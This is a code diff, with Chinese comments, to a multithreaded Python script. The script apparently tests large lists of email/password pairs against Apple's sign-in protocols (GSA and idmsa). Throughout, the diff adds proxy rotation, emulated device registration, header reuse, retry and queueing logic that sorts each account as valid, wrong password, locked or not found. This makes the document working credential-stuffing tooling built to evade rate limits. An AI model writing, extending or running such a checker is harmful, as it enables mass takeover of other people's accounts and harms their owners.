@@ -184,8 +184,20 @@ def proxy_alive(proxy, timeout=8.0):
         session.close()
 
 
-def classify_web_method(web):
-    """把 au=repair 的 web 响应细化成具体流程（不改变 GSA 的 need_2fa 结论）。
+def web_auth_type(web, trace=None):
+    """取 Web 完成阶段的 authType。
+
+    idmsa 的安全结果不带 auth_type，该字段只在 trace.complete
+    里返回；兼容测试或旧实现直接放在结果中的情况。
+    """
+    web = web if isinstance(web, dict) else {}
+    trace = trace if isinstance(trace, dict) else {}
+    complete = trace.get('complete') if isinstance(trace.get('complete'), dict) else {}
+    return str(complete.get('auth_type') or web.get('auth_type') or '').strip().casefold()
+
+
+def classify_web_method(web, trace=None):
+    """把 au=repair 的 web 响应细化成具体流程。
 
     对应 cluster-lab 的 _repair_probe_method：
       verification_code  — 确实是验证码挑战
@@ -194,12 +206,22 @@ def classify_web_method(web):
     """
     web = web if isinstance(web, dict) else {}
     status = str(web.get('status') or '').strip().casefold()
-    auth = str(web.get('auth_type') or '').strip().casefold()
+    auth = web_auth_type(web, trace)
     if status == 'need_2fa' and auth in ('hsa', 'hsa2'):
         return 'verification_code'
     if auth in ('sa', 'non-sa', 'dnu') or status == 'needs_setup':
         return 'security_repair'
     return 'repair_unspecified'
+
+
+def refine_repair_web_status(gsa_status, web, trace=None):
+    """仅在 Web 完成 SRP 后明确证明密码时改归“密码正确”。"""
+    web = web if isinstance(web, dict) else {}
+    auth = web_auth_type(web, trace)
+    status = str(web.get('status') or '').strip().casefold()
+    if auth in ('sa', 'non-sa') and status in ('valid', 'needs_setup'):
+        return 'valid'
+    return gsa_status
 
 
 # 只有这些原因值得换环境重试；明确结论（密码错/锁定/不存在/双重验证）绝不重试
@@ -362,14 +384,17 @@ def local_exception_result(exc):
     return result
 
 
-def classify_web(web):
+def classify_web(web, trace=None):
     """web(idmsa) 的 detail 是中文，不能走英文关键词匹配，直接看 ec。"""
+    trace = trace if isinstance(trace, dict) else {}
+    complete = trace.get('complete') if isinstance(trace.get('complete'), dict) else {}
+    latest = complete or (trace.get('init') if isinstance(trace.get('init'), dict) else {})
     try:
         ec = int(web.get('apple_ec'))
     except (TypeError, ValueError):
         ec = None
     try:
-        http = int(web.get('http') or 0)
+        http = int(latest.get('http') or web.get('http') or 0)
     except (TypeError, ValueError):
         http = 0
     if ec == -20209:
@@ -378,11 +403,16 @@ def classify_web(web):
         return 'wrong_password'     # 账户信息不正确
     if ec in (-20970,):
         return 'not_found'
-    if ec == -22421 or http in (502, 503):
+    if ec == -22421 or http in (500, 502, 503, 504):
         return 'web_unavailable'    # 链路/前置层拒绝，不代表账号状态
     if http == 0:
         return 'web_timeout'
     return str(web.get('status') or 'error')
+
+
+def web_retryable(status):
+    """只有 Web 补充请求的真实链路故障才需要换出口。"""
+    return status in ('web_timeout', 'web_unavailable')
 
 
 def fetch_usable_ip(api, timeout=8.0, attempts=4):
@@ -426,6 +456,46 @@ def proxy_api_default():
     return ''
 
 
+def final_progress_fields(results):
+    """Copy authoritative terminal counters out of mutable worker state."""
+    return {'by_status': dict(results.get('by_status') or {}),
+            'recent': list(results.get('recent') or [])}
+
+
+class ProcessDeviceHeaderCache:
+    """Short-lived public headers bound to one process-owned device slot."""
+
+    def __init__(self, clock=time.monotonic):
+        self.clock = clock
+        self.lock = threading.Lock()
+        self.entries = {}
+
+    def take(self, slot, reuse):
+        if int(reuse) <= 0:
+            return None
+        with self.lock:
+            entry = self.entries.get(int(slot))
+            if (not entry or entry['expires'] <= self.clock()
+                    or entry['used'] >= int(reuse)):
+                self.entries.pop(int(slot), None)
+                return None
+            entry['used'] += 1
+            return dict(entry['headers'])
+
+    def bind_used(self, slot, headers, ttl, reuse):
+        if int(reuse) <= 0:
+            return
+        with self.lock:
+            self.entries[int(slot)] = {
+                'headers': dict(headers), 'used': 1,
+                'expires': self.clock() + max(1.0, float(ttl)),
+            }
+
+    def invalidate(self, slot):
+        with self.lock:
+            self.entries.pop(int(slot), None)
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument('--accounts', default='/Users/xxx/Downloads/测试.txt')
@@ -433,6 +503,12 @@ def main():
     ap.add_argument('--fastcheck', default='',
                     help='fastcheck 所在目录；留空则用包内自带的 fastcheck/')
     ap.add_argument('--device-root', default='./data/devices-simple')
+    ap.add_argument('--device-slots', default=None,
+                    help='本进程独占槽位，逗号分隔；未传=加载全部，- = 空分组')
+    ap.add_argument('--new-slot-start', type=int, default=0, dest='new_slot_start',
+                    help='本进程注册新设备时的首个槽位')
+    ap.add_argument('--new-slot-step', type=int, default=1, dest='new_slot_step',
+                    help='本进程新增槽位步长（多进程时避免重叠）')
     ap.add_argument('--threads', type=int, default=50)
     ap.add_argument('--limit', type=int, default=0, help='0=全部')
     ap.add_argument('--offset', type=int, default=0, help='从第几条账号开始（多进程切分用）')
@@ -453,7 +529,7 @@ def main():
     ap.add_argument('--anisette-workers', type=int, default=0,
                     help='并发请求公共头的上限，0=自动（最多100）')
     ap.add_argument('--verify-web', action='store_true', dest='verify_web',
-                    help='GSA 判为 locked/security_lock 时，用 web 协议(idmsa)再验一次')
+                    help='GSA 返回 au=repair 时，用 web 协议(idmsa)细分一次')
     ap.add_argument('--web-timeout', type=float, default=10.0, dest='web_timeout')
     ap.add_argument('--no-client-cache', action='store_true',
                     help='关闭 Client 复用（每条都新建，用于对照）')
@@ -464,7 +540,7 @@ def main():
                     help='anisette 单次请求超时；连不上时会快速失败')
     ap.add_argument('--register-timeout', type=float, default=20.0,
                     dest='register_timeout',
-                    help='设备注册单次超时；超时后换代理继续注册')
+                    help='设备初始化总超时；预算内退避重试，耗尽后账号记为超时')
     ap.add_argument('--per-ip', type=int, default=1,
                     help='一条 IP 跑多少条账号（1=每个任务换新 IP，走 IP 池 rotate）')
     ap.add_argument("--otp-reuse", type=int, default=15, dest="otp_reuse",
@@ -491,15 +567,30 @@ def main():
             f'找不到 fastcheck 模块。应放在 {_local}，'
             f'或用 --fastcheck 指定目录')
     from fastcheck.protocols import gsa_status as gs
-    from fastcheck.devices import DevicePool, count_registered_devices
+    from fastcheck.devices import (DevicePool, count_registered_devices,
+                                   registered_device_slots)
     from fastcheck.protocols.srp_auth import SRP_MATH_BACKEND
     from fastcheck.status import result_bucket
 
-    # One process owns one in-memory device registry.  Slot state is loaded
-    # once and registration writes through to disk only when it changes.
+    assigned_slots = []
+    if args.device_slots is None:
+        assigned_slots = registered_device_slots(
+            args.device_root, 'https://new.ani.sidestore.io')
+    elif args.device_slots.strip() not in ('', '-'):
+        assigned_slots = [int(value) for value in args.device_slots.split(',')
+                          if value.strip() and int(value) > 0]
+    new_slot_start = int(args.new_slot_start or 0)
+    if new_slot_start <= 0:
+        new_slot_start = max(assigned_slots or [args.slot_base]) + 1
+    # Each process owns its assigned slots and loads them into memory once.
+    # New slot sequences are disjoint when run_mp supplies a step > 1.
     device_pool = DevicePool(
         args.device_root, 'https://new.ani.sidestore.io',
-        max_devices=args.slot_base + args.threads, in_memory=True)
+        max_devices=max(args.slot_base + args.threads, new_slot_start,
+                        *(assigned_slots or [1])), in_memory=True)
+    loaded_devices = device_pool.configure_worker_slots(
+        assigned_slots, new_slot_start=new_slot_start,
+        new_slot_step=args.new_slot_step)
 
     os.makedirs(os.path.dirname(args.out) or '.', exist_ok=True)
     if args.offset or args.limit:
@@ -510,15 +601,18 @@ def main():
     else:
         rows = load_accounts(args.accounts, 0)
     print(f'账号 {len(rows)} 条（offset={args.offset}）| 线程 {args.threads} '
-          f'| 槽位 {args.slot_base + 1}-{args.slot_base + args.threads} '
-          f'| SRP {SRP_MATH_BACKEND}')
+          f'| 本进程设备 {loaded_devices} 台 | 新槽位 {new_slot_start} '
+          f'步长 {max(1, args.new_slot_step)} | SRP {SRP_MATH_BACKEND}')
     if nofile_limit is not None:
         print(f'文件描述符上限 {nofile_limit}')
     if SRP_MATH_BACKEND != 'gmpy2':
         print('  警告：gmpy2 未生效，SRP 单次约 9.8ms 而不是 2.2ms')
 
     _rw = int(args.register_workers)
-    register_gate = threading.Semaphore(_rw if _rw > 0 else max(1, args.threads))
+    # Default is full registration concurrency: every worker may register.
+    # The semaphore remains only for an explicit --register-workers override.
+    register_limit = _rw if _rw > 0 else max(1, args.threads)
+    register_gate = threading.Semaphore(register_limit)
     _aw = int(args.anisette_workers)
     anisette_limit = anisette_concurrency_limit(args.threads, _aw)
     anisette_gate = threading.Semaphore(anisette_limit)
@@ -536,11 +630,22 @@ def main():
         print(f'IP 池: 预热 {warmed} 条（每线程先分 1 条，其余共享） '
               f'ttl={args.ip_ttl:.0f}s 单次上限={args.ip_batch}')
 
-    # 按线程预切分：线程只读自己的列表，共享队列彻底消失
-    shards = [[] for _ in range(args.threads)]
-    for index, item in enumerate(rows):
-        shards[index % args.threads].append(item)
-    print(f'账号已切成 {args.threads} 份，每份约 {len(rows)//args.threads} 条')
+    # 设备与公共头准备好之前不分配账号。共享队列仅在真正准备发业务
+    # 请求时弹出一条，因此注册等待/失败不会污染任何账号结果。
+    import collections
+    task_queue = collections.deque(rows)
+    task_queue_lock = threading.Lock()
+    active_workers = min(max(0, len(rows)), max(1, args.threads))
+    print(f'账号进入共享待领队列 {len(rows)} 条；启动 {active_workers} 个工作线程；'
+          f'设备注册并发 {register_limit}（默认全额）')
+
+    def pending_task_count():
+        with task_queue_lock:
+            return len(task_queue)
+
+    def take_task():
+        with task_queue_lock:
+            return task_queue.popleft() if task_queue else None
     lock = _new_state_lock()
     sink_lock = threading.Lock()       # 结果落盘不占用状态锁
     budget_lock = threading.Lock()     # 预算日志有独立的 I/O 锁
@@ -548,9 +653,11 @@ def main():
     info_cache = {}
     sink = open(args.out, 'w', encoding='utf-8')
     write_buffer = []          # 攒够再落盘，避免每条都 fsync
+    worker_leases = {}         # tid -> process-local in-memory device claim
+    worker_registration_permits = set()
+    device_headers = ProcessDeviceHeaderCache()
     # 预算耗尽专用日志：每条 budget_hit 一行，含 OTP/每跳耗时拆解，方便单独分析
     budget_sink = open(os.path.splitext(args.out)[0] + '-budget.jsonl', 'w', encoding='utf-8')
-    import collections
     started = time.perf_counter()
     wall_started = time.time()
     proc_cpu_start = time.process_time()
@@ -655,8 +762,9 @@ def main():
             stop.wait(1.0)
 
     def worker(tid):
-        my_tasks = shards[tid] if tid < len(shards) else []
-        slot = args.slot_base + tid + 1
+        if pending_task_count() <= 0:
+            return
+        preferred_slot = args.slot_base + tid + 1
         # ---- 1) 领一条 IP ----
         proxy = None
         if ip_pool is None:
@@ -677,25 +785,42 @@ def main():
         boot = {}
         _b0 = time.thread_time()
         pool = device_pool
+        # Ready device first. Only a bounded cohort may reserve/register a new
+        # device; waiters re-check the ready pool after entering the gate.
+        slot_lease = pool.acquire_ready_worker_slot()
+        if slot_lease is None:
+            while not stop.is_set() and pending_task_count() > 0:
+                if register_gate.acquire(timeout=0.5):
+                    with lock:
+                        worker_registration_permits.add(tid)
+                    break
+            if stop.is_set() or pending_task_count() <= 0:
+                return
+            slot_lease = pool.acquire_ready_worker_slot()
+            if slot_lease is None:
+                slot_lease = pool.reserve_new_worker_slot()
+        slot = slot_lease.slot
+        with lock:
+            worker_leases[tid] = slot_lease
         boot['pool_ctor'] = (time.thread_time() - _b0) * 1000
         # 注册前就把型号定下来，随 provisioning 一起提交给 anisette；
         # 之后这台设备的所有请求都必须报同一个型号。
         _b0 = time.thread_time()
         profile = device_profile(pool, slot) if not args.no_fix_os else None
         boot['profile'] = (time.thread_time() - _b0) * 1000
-        state = pool.inspect(slot).get('state')
+        state = 'ready' if slot_lease.ready else pool.inspect(slot).get('state')
         needs_registration = not args.no_register and state != 'ready'
         if needs_registration:
             with lock:
                 results['device_registering'].add(slot)
 
-        def acquire_anisette_route():
+        def acquire_anisette_route(wait):
             """注册/公共头都用线程自己的代理；池模式失败后可换下一条。"""
             nonlocal proxy
             if not args.anisette_proxy:
                 return None, 0.0
             if ip_pool is not None:
-                return ip_pool.acquire(tid, wait=60.0)
+                return ip_pool.acquire(tid, wait=max(0.0, min(60.0, wait)))
             if proxy is None:
                 proxy = (fetch_one_ip(args.api) if args.no_precheck
                          else fetch_usable_ip(args.api, args.precheck_timeout))
@@ -708,36 +833,73 @@ def main():
             elif route and not healthy:
                 proxy = None
 
-        # 首次注册失败不能让整个 worker 退出。代理模式下丢弃坏出口，
-        # 换下一条继续，直到本线程的设备槽位注册成功或任务被停止。
+        # 设备注册期间尚未领取账号。每个窗口耗尽只重置注册等待窗口，
+        # 绝不能把共享队列里尚未请求的账号批量写成 timeout。
         _info_cpu = _register_cpu = 0.0
         _w0 = time.perf_counter()
+        setup_deadline = _w0 + max(1.0, float(args.register_timeout))
         info = None
         register_failures = 0
+        last_register_reason = 'timeout'
         while not stop.is_set():
-            reg_proxy, reg_exp = acquire_anisette_route()
+            remaining = setup_deadline - time.perf_counter()
+            if remaining <= 0:
+                # Registration timed out before any account was claimed. First
+                # borrow an idle ready device; if none exists, abandon only the
+                # pending device slot and retry registration on a fresh slot.
+                replacement = pool.acquire_ready_worker_slot()
+                reused_ready = replacement is not None
+                if replacement is None:
+                    replacement = pool.reserve_new_worker_slot()
+                old_slot, old_lease = slot, slot_lease
+                device_headers.invalidate(old_slot)
+                with lock:
+                    results['device_registering'].discard(old_slot)
+                    results['device_in_use'].discard(old_slot)
+                    worker_leases[tid] = replacement
+                old_lease.close()
+                slot_lease = replacement
+                slot = replacement.slot
+                profile = device_profile(pool, slot) if not args.no_fix_os else None
+                needs_registration = not replacement.ready
+                if needs_registration:
+                    with lock:
+                        results['device_registering'].add(slot)
+                with lock:
+                    kinds = results['register_error_types']
+                    action = 'reuse_idle' if reused_ready else 'register_new'
+                    key = f'{action}:{last_register_reason}'
+                    kinds[key] = kinds.get(key, 0) + 1
+                setup_deadline = time.perf_counter() + max(
+                    1.0, float(args.register_timeout))
+                register_failures = 0
+                last_register_reason = 'timeout'
+                continue
+            reg_proxy, reg_exp = acquire_anisette_route(remaining)
             if args.anisette_proxy and not reg_proxy:
                 with lock:
                     results['register_errors'] += 1
                     kinds = results['register_error_types']
                     kinds['no_proxy'] = kinds.get('no_proxy', 0) + 1
                 register_failures += 1
-                stop.wait(min(8.0, 0.25 * (2 ** min(register_failures, 5)))
-                          + random.uniform(0.0, 0.25))
+                last_register_reason = 'no_proxy'
+                delay = (min(8.0, 0.25 * (2 ** min(register_failures, 5)))
+                         + random.uniform(0.0, 0.25))
+                stop.wait(min(delay, max(0.0, setup_deadline - time.perf_counter())))
                 continue
             try:
                 _b0 = time.thread_time()
                 info = _shared_device_info(
                     pool, profile, info_cache, info_gate,
-                    max(args.timeout, 20), proxy=reg_proxy,
+                    max(1.0, min(max(args.timeout, 20), remaining)), proxy=reg_proxy,
                     provider_direct=reg_proxy is None)
                 _info_cpu += (time.thread_time() - _b0) * 1000
                 if needs_registration:
                     _b0 = time.thread_time()
-                    with register_gate:
-                        pool.fetch_headers(
-                            slot, info, max(1.0, float(args.register_timeout)), registered=False,
-                            proxy=reg_proxy, provider_direct=reg_proxy is None)
+                    pool.fetch_headers(
+                        slot, info, max(1.0, min(float(args.register_timeout), remaining)), registered=False,
+                        proxy=reg_proxy, provider_direct=reg_proxy is None)
+                    pool.mark_worker_slot_ready(slot)
                     _register_cpu += (time.thread_time() - _b0) * 1000
                 release_anisette_route(reg_proxy, reg_exp, True)
                 with lock:
@@ -750,17 +912,23 @@ def main():
                 stage = str(getattr(exc, 'stage', '') or type(exc).__name__)
                 http = int(getattr(exc, 'http', 0) or 0)
                 reason = f'{stage}:HTTP{http}' if http else stage
+                last_register_reason = reason
                 with lock:
                     results['register_errors'] += 1
                     kinds = results['register_error_types']
                     kinds[reason] = kinds.get(reason, 0) + 1
-                if not args.anisette_proxy:
-                    raise
-                # 不设全局并发上限；每个线程独立换代理重试。但失败后必须退避，
-                # 否则数百线程会同时重建 TLS/WebSocket，吃满 CPU 并把 503 放大。
+                # Whether direct or proxied, back off inside the current setup
+                # window.  When the window rolls over the worker keeps waiting;
+                # no account has been claimed yet, so there is nothing to mark.
                 register_failures += 1
-                stop.wait(min(8.0, 0.25 * (2 ** min(register_failures, 5)))
-                          + random.uniform(0.0, 0.25))
+                delay = (min(8.0, 0.25 * (2 ** min(register_failures, 5)))
+                         + random.uniform(0.0, 0.25))
+                stop.wait(min(delay, max(0.0, setup_deadline - time.perf_counter())))
+        with lock:
+            had_registration_permit = tid in worker_registration_permits
+            worker_registration_permits.discard(tid)
+        if had_registration_permit:
+            register_gate.release()
         if info is None:
             return
         boot['info'] = _info_cpu
@@ -808,9 +976,8 @@ def main():
             return raw
 
         # ---- 3) 循环验证：每 per_ip 条换 IP，每 otp_reuse 条换公共头 ----
-        cached_otp = None
-        otp_used = 0
         local_retries = {}
+        retry_tasks = []
         with lock:
             bag = results.setdefault('boot_segments', {})
             for k, v in boot.items():
@@ -827,10 +994,9 @@ def main():
             if proxy is None:
                 with lock:
                     results['ip_fail'] += 1
-                # 代理池短暂断货不能让 worker 退出，否则这个线程
-                # 已分配但未处理的整个账号分片会被直接丢下，最终任务
-                # 显示 incomplete。保留分片等待 supplier 下一次补池。
-                if not wait_for_proxy_when_tasks_remain(len(my_tasks), stop.is_set()):
+                # 代理池短暂断货不能消费账号；保留共享队列等待补池。
+                pending = len(retry_tasks) + pending_task_count()
+                if not wait_for_proxy_when_tasks_remain(pending, stop.is_set()):
                     break
                 stop.wait(0.5 + random.uniform(0.0, 0.5))
                 continue
@@ -840,9 +1006,43 @@ def main():
             while served < args.per_ip and not stop.is_set():
                 t_loop = time.perf_counter()
                 gap_ms = (t_loop - t_prev_end) * 1000   # 轮与轮之间的空档
-                if not wait_for_proxy_when_tasks_remain(len(my_tasks), stop.is_set()):
+                pending = len(retry_tasks) + pending_task_count()
+                if not wait_for_proxy_when_tasks_remain(pending, stop.is_set()):
                     break
-                email, password = my_tasks.pop()
+                t_otp = time.perf_counter()
+                c0_otp = time.thread_time()
+                otp_cpu = chk_cpu = 0.0
+                otp_metric = None
+                # 先确保设备公共头可用，再领取账号。公共头故障只影响线程，
+                # 不得生成账号结果或从队列移除账号。
+                try:
+                    identity = device_headers.take(slot, args.otp_reuse)
+                    if identity is None:
+                        identity = fetch_otp()
+                        device_headers.bind_used(
+                            slot, identity,
+                            max(10.0, min(60.0, float(args.ip_ttl))),
+                            args.otp_reuse)
+                        otp_metric = 'fetch'
+                    else:
+                        otp_metric = 'hit'
+                except Exception as exc:                           # noqa: BLE001
+                    with lock:
+                        kinds = results['register_error_types']
+                        key = f'public_header:{type(exc).__name__}'
+                        kinds[key] = kinds.get(key, 0) + 1
+                    device_headers.invalidate(slot)
+                    if args.anisette_proxy:
+                        proxy_failed = True
+                        break
+                    stop.wait(anisette_retry_delay(0))
+                    continue
+                otp_ms = (time.perf_counter() - t_otp) * 1000
+                otp_cpu = (time.thread_time() - c0_otp) * 1000
+                task = retry_tasks.pop() if retry_tasks else take_task()
+                if task is None:
+                    break
+                email, password = task
                 task_key = (email, password)
                 local_retry_count = local_retries.get(task_key, 0)
                 t0 = time.perf_counter()
@@ -850,30 +1050,13 @@ def main():
                 attempts = 0
                 retry_reason = ''
                 budget_hit = False
-                t_otp = time.perf_counter()
-                c0_otp = time.thread_time()
-                otp_cpu = chk_cpu = 0.0
                 attempt_ms = []                 # 每次 gs.check 的实际墙钟耗时
                 budget_left_ms = None            # 预算耗尽时还剩多少（负数=超出）
                 retry_ip_ms = []                 # 重试换 IP 时 ip_pool.acquire 的等待耗时
                 ip_wait_none = False             # 重试里是否因为「等不到 IP」而中断
                 budget = max(1.0, float(args.item_timeout))
                 gsa_started = False
-                otp_metric = None
                 try:
-                    # 同一个 OTP 复用若干条：设备注册时那一次就能摊薄到 15 条上
-                    needs_otp = (cached_otp is None or args.otp_reuse <= 0
-                                 or otp_used >= args.otp_reuse)
-                    if needs_otp:
-                        cached_otp = fetch_otp()
-                        otp_used = 0
-                        otp_metric = 'fetch'
-                    else:
-                        otp_metric = 'hit'
-                    identity = cached_otp
-                    otp_used += 1
-                    otp_ms = (time.perf_counter() - t_otp) * 1000
-                    otp_cpu = (time.thread_time() - c0_otp) * 1000
                     # ---- 外层重试：只有链路/环境问题才换环境重来 ----
                     attempts = 0
                     t_chk = time.perf_counter()
@@ -925,12 +1108,13 @@ def main():
                                 break
                         # 环境异常（-22421）还要顺带换一个公共头
                         if kind == RETRY_ENV:
-                            cached_otp = None
-                            otp_used = 0
+                            device_headers.invalidate(slot)
                             try:
-                                cached_otp = fetch_otp()
-                                identity = cached_otp
-                                otp_used = 1
+                                identity = fetch_otp()
+                                device_headers.bind_used(
+                                    slot, identity,
+                                    max(10.0, min(60.0, float(args.ip_ttl))),
+                                    args.otp_reuse)
                                 otp_metric = 'fetch'
                             except Exception:
                                 pass
@@ -951,8 +1135,7 @@ def main():
                     if (result.get('status') == 'timeout' and previous < args.retry
                             and not stop.is_set()):
                         local_retries[task_key] = previous + 1
-                        cached_otp = None
-                        otp_used = 0
+                        device_headers.invalidate(slot)
                         replacement = proxy
                         used_proxy = local_exception_used_proxy(
                             gsa_started, args.anisette_proxy)
@@ -971,7 +1154,7 @@ def main():
                                            else fetch_usable_ip(args.api, args.precheck_timeout))
                         if replacement is not None:
                             proxy = replacement
-                            my_tasks.append((email, password))
+                            retry_tasks.append((email, password))
                             continue
                     local_retries.pop(task_key, None)
                 if local_retry_count:
@@ -994,6 +1177,10 @@ def main():
                 web_status = web_ec = None
                 web_detail = ''
                 web_method = None
+                web_auth = ''
+                web_attempts = 0
+                web_proxy_rotations = 0
+                web_rotation_exhausted = False
                 web_ms = 0.0
                 final_status = status
                 overridden = False
@@ -1006,23 +1193,68 @@ def main():
                 if wants_web:
                     from fastcheck.protocols import idmsa
                     wt0, wc0 = time.perf_counter(), time.thread_time()
-                    try:
-                        web = idmsa.check(email, password, proxy,
-                                          timeout=args.web_timeout, retries=0)
-                        web_ec = web.get('apple_ec')
-                        web_status = classify_web(web)
-                        web_detail = str(web.get('detail') or '')[:120]
-                    except Exception as exc:                        # noqa: BLE001
-                        web_status = 'web_error'
+                    web_trace = {}
+                    for web_attempt in range(max(0, int(args.retry)) + 1):
+                        web_trace = {}
+
+                        def remember_web_trace(entry):
+                            if not isinstance(entry, dict):
+                                return
+                            stage = str(entry.get('stage') or '')
+                            if stage in ('init', 'complete'):
+                                web_trace[stage] = {
+                                    'http': entry.get('http'),
+                                    'auth_type': entry.get('auth_type'),
+                                }
+                        web_attempts += 1
+                        try:
+                            web = idmsa.check(email, password, proxy,
+                                              timeout=args.web_timeout, retries=0,
+                                              trace=remember_web_trace)
+                            web_ec = web.get('apple_ec')
+                            web_status = classify_web(web, web_trace)
+                            web_detail = str(web.get('detail') or '')[:120]
+                        except Exception as exc:                    # noqa: BLE001
+                            web = {}
+                            web_status = 'web_error'
+                            web_detail = type(exc).__name__
+                        if not web_retryable(web_status):
+                            break
+                        proxy_failed = True
+                        if web_attempt >= max(0, int(args.retry)) or stop.is_set():
+                            break
+                        replacement = None
+                        if ip_pool is not None:
+                            _t_ip = time.perf_counter()
+                            ip_pool.release(tid, proxy, proxy_exp, healthy=False)
+                            proxy = None
+                            proxy_exp = 0.0
+                            replacement, proxy_exp = ip_pool.acquire(tid, wait=20.0)
+                            retry_ip_ms.append(round((time.perf_counter() - _t_ip) * 1000, 1))
+                        elif args.api:
+                            replacement = (fetch_one_ip(args.api) if args.no_precheck
+                                           else fetch_usable_ip(args.api, args.precheck_timeout))
+                        if replacement is None:
+                            web_rotation_exhausted = True
+                            break
+                        proxy = replacement
+                        proxy_failed = False
+                        web_proxy_rotations += 1
                     web_ms = round((time.perf_counter() - wt0) * 1000, 1)
                     thread_cpu += (time.thread_time() - wc0) * 1000
                     elapsed = (time.perf_counter() - t0) * 1000
-                    # GSA 权威，web 只细化"到底是要验证码还是要做安全修复"
-                    web_method = classify_web_method(web)
+                    web_auth = web_auth_type(web, web_trace)
+                    web_method = classify_web_method(web, web_trace)
+                    # sa/non-sa 表示 Web 已完成 SRP 密码验证；与
+                    # cluster-lab 一致归入“密码正确”。其他 Web
+                    # 结果只做细分，不覆盖 GSA 结论。
+                    final_status = refine_repair_web_status(status, web, web_trace)
+                    overridden = final_status != status
                 row = {'tid': tid, 'slot': slot, 'email': email,
                        'raw_status': raw_status,
                        'proxy': _proxy_host(proxy),
-                       'status': status, 'final': final_status,
+                       'status': final_status, 'gsa_status': status,
+                       'final': final_status,
                        'overridden': overridden,
                        'ec': result.get('apple_ec'),
                        'detail': str(result.get('apple_message')
@@ -1037,6 +1269,10 @@ def main():
                        'chk_ms': round(chk_ms, 1), 'gap_ms': round(gap_ms, 2),
                        'web_status': web_status, 'web_ec': web_ec,
                        'web_detail': web_detail, 'web_method': web_method,
+                       'web_auth_type': web_auth,
+                       'web_attempts': web_attempts,
+                       'web_proxy_rotations': web_proxy_rotations,
+                       'web_rotation_exhausted': web_rotation_exhausted,
                        'web_ms': round(web_ms, 1)}
                 line = json.dumps(row, ensure_ascii=False)
                 budget_line = None
@@ -1119,12 +1355,14 @@ def main():
                 served += 1
                 mine += 1
                 t_prev_end = time.perf_counter()
+                if proxy_failed:
+                    break
             if ip_pool is not None:
                 ip_pool.release(
                     tid, proxy, proxy_exp,
                     healthy=(ok_count > 0 or not proxy_failed))
             if served == 0:
-                if not my_tasks:
+                if not retry_tasks and pending_task_count() <= 0:
                     break
                 stop.wait(0.5 + random.uniform(0.0, 0.5))
         with lock:
@@ -1145,13 +1383,22 @@ def main():
                     f'{type(exc).__name__}: {exc}')
             traceback.print_exc()
         finally:
-            slot = args.slot_base + tid + 1
             with lock:
-                results['device_registering'].discard(slot)
-                results['device_in_use'].discard(slot)
+                slot_lease = worker_leases.pop(tid, None)
+                had_registration_permit = tid in worker_registration_permits
+                worker_registration_permits.discard(tid)
+            if had_registration_permit:
+                register_gate.release()
+            slot = slot_lease.slot if slot_lease is not None else None
+            with lock:
+                if slot is not None:
+                    results['device_registering'].discard(slot)
+                    results['device_in_use'].discard(slot)
+            if slot_lease is not None:
+                slot_lease.close()
 
     threads = [threading.Thread(target=worker_guarded, args=(i,), name=f'w{i}', daemon=True)
-               for i in range(args.threads)]
+               for i in range(active_workers)]
     for thread in threads:
         thread.start()
     for thread in threads:
@@ -1171,6 +1418,10 @@ def main():
     done_now = results['done']
     expected_now = len(rows)
     results['incomplete'] = max(0, expected_now - done_now)
+    # The periodic writer may have emitted its last snapshot while workers
+    # were still finishing.  Persist the authoritative final counters/rows.
+    with lock:
+        final_progress = final_progress_fields(results)
     try:
         with open(args.live, encoding='utf-8') as handle:
             final = json.load(handle)
@@ -1179,6 +1430,7 @@ def main():
         final['status'] = 'complete' if results['incomplete'] == 0 else 'incomplete'
         final['expected'] = expected_now
         final['done'] = done_now
+        final.update(final_progress)
         final['incomplete'] = results['incomplete']
         final['elapsed'] = round(wall, 1)
         device_registered = count_registered_devices(
